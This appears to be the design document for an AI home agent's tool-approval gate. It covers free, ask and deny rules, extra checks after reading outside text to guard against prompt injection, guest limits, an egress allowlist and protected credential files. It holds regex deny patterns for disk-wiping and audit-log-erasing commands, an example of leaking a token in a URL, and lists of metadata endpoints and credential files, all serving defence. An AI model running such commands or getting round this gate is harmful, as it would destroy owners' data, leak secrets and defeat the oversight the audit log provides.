# Approval matrix

What JARVIS may do without asking, what it must ask about, and what it is
refused outright. One table, enforced by one `pre_tool_call` hook
(`matrix_gate` in `hermes/plugins/_shared/_approval_hook.py`, registered by the
`aura-guard` plugin) that Hermes calls for **every** tool — built-in,
plugin and MCP alike.

Three rules about how the table is read:

1. **The strictest matching row wins**, not the first: `deny` beats `ask`
   beats `free`, whatever order the rows are in.
2. **A tool with no row gets `ask`.** The default is a backstop for a tool
   added tomorrow, not how the stack normally runs — every tool this
   deployment registers has a row, and a test fails if one loses it.
3. **While the kill switch is engaged every non-`free` verdict becomes
   `deny`.** Reads keep working; nothing reaches the world.

226 rows over 310 tools.

## After a turn has read outside text

A turn that has read someone else's words (a page, a mail, a file, the screen: the
readers in `_shared/_taint.py`) is held to more than the rows below, because those
words may be what asked for the call. The readers, where a name ending in `_` is
every tool that starts with it (`mcp__` is every tool of every connected server):
`api_add`, `browser_`, `calendar_events`, `calls_status`, `connect_read`, `connector_call`, `contacts_`, `delegate_task`, `desktop_files`, `desktop_notes`, `desktop_screen`, `desktop_windows`, `extract_`, `feeds`, `files_search`, `fileshare_list`, `fileshare_read`, `grafana_panel_query`, `grafana_query`, `integration_inspect`, `integration_search`, `jellyfin_resume`, `jellyfin_search`, `jellyfin_sessions`, `mail_read`, `mail_search`, `mcp__`, `mcp_add`, `memory_proposals`, `n8n_execution`, `place_search`, `plex_`, `read_file`, `recording_transcribe`, `search_files`, `session_search`, `texts_read`, `texts_search`, `vision_analyze`, `web_`. A shell call that has an `http(s)://` address in
it which is not one of the stack's own hosts is a reader too: its output is what
came back. Every tool on a free row is on this list or is named, with the reason it
is not, in `hermes/plugins/tests/test_readers_complete.py`, so a new free tool
fails there until someone decides. Then:

- A row that asks says on its card what was read, under a key no earlier answer covers.
- A row a capability level made free asks again.
- `delegate_task`, `emergency_alert`, and an addition to `memory` or `fact_store`,
  ask once for each call.
- A free fetch (`api_add`, `browser_navigate`, `feeds`, `kanban_attach_url`, `mcp_add`, `process`, `terminal`, `vision_analyze`, `watch_add`, `web_extract`) asks once for each call that reaches
  an address the session was not given: one that is not, as written, in a tool result
  the session was shown or in the owner's own words, or that the model itself wrote
  before it was shown; and that is not one of the stack's own hosts. The card shows the
  address. A link the turn was given is followed with no ask. A service document
  handed to `api_add` as text is one piece: it asks unless the session was shown it
  whole, because a path written in it carries as much as an address.
- Text put into the page the browser has open (`browser_dialog`, `browser_press`, `browser_type`)
  asks once for each call unless it is the owner's own words of the session, in the case they
  were said, as whole words and with one space between them (white space is the model's
  own: a page can count it). This one holds in every turn, marked or not: the page is
  itself someone else's words. The card shows the text, every character of it in a
  shape that can be seen, and the page's host; text or an address too long for a card
  is said to be. A named key (Enter, Tab, the arrows) is not text; any other key is.
- A shell call (`process`, `terminal`) asks once for each call after a read from
  beyond the house, whatever the command is: every reader except the owner's own files
  and history (`desktop_files`, `desktop_notes`, `files_search`, `fileshare_list`, `fileshare_read`, `mcp__notes__directory_tree`, `mcp__notes__get_file_info`, `mcp__notes__list_allowed_directories`, `mcp__notes__list_directory`, `mcp__notes__list_directory_with_sizes`, `mcp__notes__read_file`, `mcp__notes__read_media_file`, `mcp__notes__read_multiple_files`, `mcp__notes__read_text_file`, `mcp__notes__search_files`, `read_file`, `search_files`, `session_search`). The card shows the whole
  command and the folder it names. A `process` call that carries no text (a list, a
  poll, a log, a wait) runs nothing and is free. After a read of the owner's own files
  only, a shell command is free unless it has an address the session was not given.
- What a file reader returns stops counting as given once the session has written a
  file or a note, or run a shell, in a turn that had read outside text, and a search of
  the history never counts: a store the model writes is not where an address is given.

Not held by these: a `web_search` query (it goes to the configured search backend); a
shell command after a read of the owner's own files that reaches a host with no
`http(s)://` address in it (one of those files can hold a page they saved); a fetch
chosen among addresses a page itself listed, which element a click lands on, and which
of the owner's words are typed; a standing yes the owner gave to `execute_code` or to
the browser's script tools in a turn that had read outside text; the house's own
state (`ha_get_state`, `ha_list_entities`, the `house_` reads) and `weather_forecast`,
which are not readers, though a device's name or a media title can be someone
else's words (the routines that run a shell after them have nobody to answer a
card); a store the model writes itself (the board, the ledger, lists, memory) read
back in a later turn; a tool description a connected server wrote, read back through
`tool_search` or `tool_describe`; a shell that fetched with no `http(s)://` written
in its command, which does not mark the turn. A shell with no way
out of its sandbox would hold all of the shell's cases with no card; it is not built.

## Refused outright

No approval prompt is offered. Each of these is either unrecoverable or is an attack on the governance itself, and an owner clicking through a prompt is not a control worth having.

| Tools | When | Rule key | Reason |
| --- | --- | --- | --- |

| `terminal`, `process` | `command` matches `\bmkfs(?:\.\w+)?\b\|\bdd\b[^\n;\|&]*\bof=/dev/(?:sd\|nvme\|vd\|hd)` | `terminal:sealed` | formats or overwrites a block device |

| `terminal`, `process` | `command` matches `\bhistory\s+-c\b\|\bshred\b[^\n]*\.(?:log\|jsonl)\b\|\b(?:rm\|truncate\|>)\b[^\n;\|&]*\baudit\.jsonl\b` | `terminal:sealed` | erases the record of what JARVIS did, which is the one thing the audit log exists to make impossible |

## When a guest is speaking

A turn whose voice is an enrolled guest's (`_shared/_speaker.py`) gets less: every `ask` row is refused rather than asked about, and a `free` row is refused too unless the tool is on this list. The list is what a guest keeps, so a new tool is closed to guests until it is added (`GUEST_FREE` in `_shared/_matrix.py`). An unrecognised voice is the key holder's turn, not a guest's.

`calculate`, `car_navigate`, `clarify`, `house_tell_user`, `house_timer`, `hud_arrange`, `hud_band`, `hud_close`, `hud_dismiss`, `hud_fly_to`, `hud_focus`, `hud_highlight`, `hud_list`, `hud_list_panels`, `hud_move`, `hud_open`, `hud_pin`, `hud_project`, `hud_resize`, `hud_return_to_reactor`, `hud_say`, `hud_set_mode`, `hud_show`, `hud_undo`, `hud_update`, `hud_zoom_to_fit`, `image_generate`, `jarvis_health`, `jellyfin_libraries`, `jellyfin_search`, `persona_status`, `phone_media`, `place_search`, `route_eta`, `skill_view`, `skills_list`, `surface_capabilities`, `text_to_speech`, `todo`, `tool_describe`, `tool_search`, `weather_forecast`, `web_extract`, `web_search`

## Egress allowlist

Where the stack may send data. Reading the public web is not bounded by this
list — an allowlist that broke web research would be switched off within a
day — but three ways of sending data to a host that is not on it are refused
(`terminal:egress`): an upload (a body flag, a form, `--upload-file`), a file
transfer (`scp`, `rsync`, `sftp`, which name `user@host:path` rather than a
URL), and any command carrying something the redactor recognises as a
credential — because `curl https://elsewhere/?t=<token>` is a GET, and the
token is in the request line. The hosts are derived from the service URLs the
settings schema already names, so configuring an integration allows exactly
its host.

| Host | |
| --- | --- |
| `*.<HOUSE_DOMAIN>` | the house's names behind Caddy: every homelab service (the zone is a setting, T-0841) |
| `127.0.0.1` | container-local or compose network |
| `::1` | container-local or compose network |
| `extract` | container-local or compose network |
| `host.docker.internal` | container-local or compose network |
| `jarvis` | container-local or compose network |
| `jarvis-adapter` | container-local or compose network |
| `localhost` | container-local or compose network |
| `searxng` | container-local or compose network |

Always refused, whatever the settings say: `169.254.169.254`, `instance-data`, `metadata.goog`, `metadata.google.internal` — the cloud instance-metadata endpoints hand out credentials to anything that can make an HTTP request.

## Files that are never readable or writable

Credentials reach tools by name from the environment. A model that can quote one can put it in a reply, a memory, a transcript or a web request, so reading these is refused rather than asked about:

`.env`, `.env.local`, `.env.production`, `.netrc`, `.pgpass`, `id_rsa`, `id_ed25519`, `credentials`, `authorized_keys`, `hermes/.env`, `auth.lock`

And these decide whether the gate runs at all, so writing them is refused at any approval level:

`config.yaml`, `agent-hooks/`, `kill-switch.json`, `shell-hooks-allowlist.json`, `audit.jsonl`, `.storage/environment.json`, `.storage/settings-proposals.json`, `.storage/connectors.json`, `approval-grants.`, `state/persona.json`
